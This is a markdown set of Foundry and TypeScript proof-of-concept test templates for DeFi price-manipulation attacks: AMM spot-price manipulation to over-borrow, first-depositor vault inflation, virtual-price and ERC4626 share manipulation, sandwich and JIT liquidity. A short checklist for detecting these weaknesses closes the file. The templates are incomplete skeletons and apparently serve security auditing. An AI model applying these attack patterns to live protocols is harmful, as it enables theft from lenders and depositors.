# Price Manipulation PoC Templates

## EVM - AMM Price Manipulation
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function sync() external;
}

contract PriceManipulationTest is Test {
    IUniswapV2Pair pair;
    IVulnerableLending lending;
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
    }

    function testAMMPriceManipulation() public {
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        uint256 priceBefore = uint256(reserve1) * 1e18 / reserve0;
        
        // Large swap to manipulate price
        uint256 swapAmount = reserve0 * 80 / 100; // 80% of reserves
        
        vm.startPrank(attacker);
        deal(address(token0), attacker, swapAmount);
        
        token0.transfer(address(pair), swapAmount);
        uint256 amountOut = getAmountOut(swapAmount, reserve0, reserve1);
        pair.swap(0, amountOut, attacker, "");
        
        // Price is now manipulated
        (reserve0, reserve1,) = pair.getReserves();
        uint256 priceAfter = uint256(reserve1) * 1e18 / reserve0;
        
        console.log("Price before:", priceBefore);
        console.log("Price after:", priceAfter);
        
        // Exploit: borrow at manipulated price
        lending.depositCollateral(collateralToken, 1 ether);
        lending.borrow(borrowToken, maxBorrowable); // Uses spot price
        
        vm.stopPrank();
    }
}
```

## EVM - Donation Attack (Vault Inflation)
```solidity
contract VaultInflationTest is Test {
    IVault vault;
    
    function testVaultInflationAttack() public {
        // First depositor attack
        vm.startPrank(attacker);
        
        // 1. Deposit minimal amount
        token.approve(address(vault), 1);
        vault.deposit(1); // Get 1 share
        
        // 2. Donate tokens directly to inflate share price
        token.transfer(address(vault), 1e18);
        
        // 3. Victim deposits
        vm.stopPrank();
        vm.startPrank(victim);
        token.approve(address(vault), 1e18);
        vault.deposit(1e18); // Gets 0 shares due to rounding!
        
        // 4. Attacker withdraws everything
        vm.stopPrank();
        vm.prank(attacker);
        vault.withdraw(1); // Gets all tokens
    }
}
```

## EVM - Virtual Price Manipulation
```solidity
contract VirtualPriceTest is Test {
    ICurvePool pool;
    
    function testVirtualPriceManipulation() public {
        uint256 virtualPriceBefore = pool.get_virtual_price();
        
        // Imbalanced deposit/withdrawal affects virtual price
        vm.prank(attacker);
        pool.add_liquidity([1e24, 0, 0], 0); // Imbalanced
        
        uint256 virtualPriceAfter = pool.get_virtual_price();
        
        // Protocol uses virtual_price as oracle
        assertGt(virtualPriceAfter, virtualPriceBefore);
    }
}
```

## EVM - ERC4626 Share Manipulation
```solidity
contract ERC4626ManipulationTest is Test {
    IERC4626 vault;
    
    function testSharePriceManipulation() public {
        // Attack: manipulate totalAssets to affect share price
        
        vm.prank(attacker);
        // Donate yield-bearing tokens to vault
        yieldToken.transfer(address(vault), 1e18);
        
        // Now 1 share = more assets
        uint256 assetsPerShare = vault.convertToAssets(1e18);
        
        // Liquidation uses this price - now incorrect
        lending.liquidate(position); // Uses manipulated price
    }
}
```

## Solana - AMM Price Manipulation
```typescript
describe("Price Manipulation", () => {
    it("manipulates Raydium AMM price", async () => {
        const poolState = await program.account.poolState.fetch(pool);
        const priceBefore = poolState.tokenAReserve / poolState.tokenBReserve;
        
        // Large swap
        await raydium.swap({
            amountIn: poolState.tokenAReserve * 0.8,
            tokenA: mintA,
            tokenB: mintB,
            pool: pool
        });
        
        const poolStateAfter = await program.account.poolState.fetch(pool);
        const priceAfter = poolStateAfter.tokenAReserve / poolStateAfter.tokenBReserve;
        
        // Exploit vulnerable lending protocol
        await vulnerableLending.borrow({
            collateral: collateralAmount,
            // Uses manipulated spot price
        });
    });
});
```

## Common Attack Vectors

### Sandwich Attack
```solidity
contract SandwichTest is Test {
    function testSandwichAttack() public {
        // 1. Front-run: buy token to raise price
        vm.prank(attacker);
        router.swapExactTokensForTokens(
            frontRunAmount, 0, path, attacker, deadline
        );
        
        // 2. Victim's transaction executes at worse price
        vm.prank(victim);
        router.swapExactTokensForTokens(
            victimAmount, minOut, path, victim, deadline
        );
        
        // 3. Back-run: sell token at higher price
        vm.prank(attacker);
        router.swapExactTokensForTokens(
            sellAmount, 0, reversePath, attacker, deadline
        );
        
        // Attacker profits from spread
    }
}
```

### JIT (Just-In-Time) Liquidity
```solidity
contract JITTest is Test {
    function testJITAttack() public {
        // 1. Add liquidity just before large swap
        vm.prank(attacker);
        router.addLiquidity(...);
        
        // 2. Large swap executes (attacker earns fees)
        vm.prank(whale);
        router.swap(...);
        
        // 3. Remove liquidity immediately
        vm.prank(attacker);
        router.removeLiquidity(...);
        
        // Attacker earned fees without IL risk
    }
}
```

## Detection Checklist
- [ ] Uses spot price without TWAP
- [ ] No slippage protection
- [ ] Vault without minimum shares
- [ ] LP token pricing vulnerable to donation
- [ ] Virtual price as oracle
- [ ] No sandwich protection
- [ ] Single-block price used for liquidations
- [ ] Missing price bounds/circuit breakers
